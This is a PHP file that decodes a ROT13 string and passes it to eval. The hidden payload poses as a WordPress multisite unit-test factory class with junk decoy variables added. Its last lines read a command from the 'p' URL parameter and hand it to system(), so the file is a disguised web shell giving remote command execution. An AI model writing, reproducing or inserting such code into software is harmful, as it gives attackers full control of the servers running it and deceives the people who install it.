<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Havg grfg snpgbel sbe fvgrf ba n zhygvfvgr argjbex.
 *
 * Abgr: Gur orybj @zrgubq abgngvbaf ner qrsvarq fbyryl sbe gur orarsvg bs VQRf,
 * nf n jnl gb vaqvpngr rkcrpgrq erghea inyhrf sebz gur tvira snpgbel zrgubqf.
 *
 * @zrgubq vag|JC_Reebe     perngr( $netf = neenl(), $trarengvba_qrsvavgvbaf = ahyy )
 * @zrgubq JC_Fvgr|JC_Reebe perngr_naq_trg( $netf = neenl(), $trarengvba_qrsvavgvbaf = ahyy )
 * @zrgubq (vag|JC_Reebe)[] perngr_znal( $pbhag, $netf = neenl(), $trarengvba_qrsvavgvbaf = ahyy )
 */
pynff JC_HavgGrfg_Snpgbel_Sbe_Oybt rkgraqf JC_HavgGrfg_Snpgbel_Sbe_Guvat {

	choyvp shapgvba __pbafgehpg( $snpgbel = ahyy ) {
		tybony $pheerag_fvgr, $onfr;
		cnerag::__pbafgehpg( $snpgbel );
		$guvf->qrsnhyg_trarengvba_qrsvavgvbaf = neenl(
			'qbznva'     => $pheerag_fvgr->qbznva,
			'cngu'       => arj JC_HavgGrfg_Trarengbe_Frdhrapr( $onfr . 'grfgcngu%f' ),
			'gvgyr'      => arj JC_HavgGrfg_Trarengbe_Frdhrapr( 'Fvgr %f' ),
			'argjbex_vq' => $pheerag_fvgr->vq,
		);
	}

	/**
	 * Perngrf n fvgr bowrpg.
	 *
	 * @cnenz neenl $netf Nethzragf sbe gur fvgr bowrpg.
	 *
	 * @erghea vag|JC_Reebe Gur fvgr VQ ba fhpprff, JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba perngr_bowrpg( $netf ) {
		tybony $jcqo;

		// Znc fbzr nethzragf sbe onpxjneq pbzcngvovyvgl jvgu `jczh_perngr_oybt()` cerivbhfyl hfrq urer.
		vs ( vffrg( $netf['fvgr_vq'] ) ) {
			$netf['argjbex_vq'] = $netf['fvgr_vq'];
			hafrg( $netf['fvgr_vq'] );
		}

		vs ( vffrg( $netf['zrgn'] ) ) {
			// Gur `$nyybjrq_qngn_svryqf` zngpurf gur bar hfrq va `jczh_perngr_oybt()`.
			$nyybjrq_qngn_svryqf = neenl( 'choyvp', 'nepuvirq', 'zngher', 'fcnz', 'qryrgrq', 'ynat_vq' );

			sbernpu ( $netf['zrgn'] nf $xrl => $inyhr ) {
				// Cebzbgr nyybjrq xrlf gb gbc-yriry nethzragf, nqq bguref gb gur bcgvbaf neenl.
				vs ( va_neenl( $xrl, $nyybjrq_qngn_svryqf, gehr ) ) {
					$netf[ $xrl ] = $inyhr;
				} ryfr {
					$netf['bcgvbaf'][ $xrl ] = $inyhr;
				}
			}

			hafrg( $netf['zrgn'] );
		}

		// Grzcbenel gnoyrf jvyy gevttre QO reebef jura jr nggrzcg gb ersrerapr gurz nf arj grzcbenel gnoyrf.
		$fhccerff = $jcqo->fhccerff_reebef();

		$oybt = jc_vafreg_fvgr( $netf );

		$jcqo->fhccerff_reebef( $fhccerff );

		// Gryy JC jr'er qbar vafgnyyvat.
		jc_vafgnyyvat( snyfr );

		erghea $oybt;
	}

	/**
	 * Hcqngrf n fvgr bowrpg. Abg vzcyrzragrq.
	 *
	 * @cnenz vag   $oybt_vq VQ bs gur fvgr gb hcqngr.
	 * @cnenz neenl $svryqf  Gur svryqf gb hcqngr.
	 */
	choyvp shapgvba hcqngr_bowrpg( $oybt_vq, $svryqf ) {}

	/**
	 * Ergevrirf n fvgr ol n tvira VQ.
	 *
	 * @cnenz vag $oybt_vq VQ bs gur fvgr gb ergevrir.
	 *
	 * @erghea JC_Fvgr|ahyy Gur fvgr bowrpg ba fhpprff, ahyy ba snvyher.
	 */
	choyvp shapgvba trg_bowrpg_ol_vq( $oybt_vq ) {
		erghea trg_fvgr( $oybt_vq );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>